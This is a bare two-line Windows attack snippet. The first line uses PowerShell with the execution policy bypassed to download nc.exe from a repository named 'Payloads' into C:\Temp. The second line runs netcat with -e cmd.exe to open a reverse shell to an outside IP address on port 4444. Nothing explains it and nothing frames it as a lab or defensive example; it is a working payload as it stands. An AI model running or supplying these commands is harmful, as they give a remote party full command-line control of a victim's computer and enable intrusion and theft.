powershell -Command "powershell -ExecutionPolicy bypass -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/Vimarkov/Payloads/blob/main/nc.exe?raw=true','C:\Temp\nc.exe');"

C:\Temp\nc.exe -e cmd.exe 83.229.69.54 4444
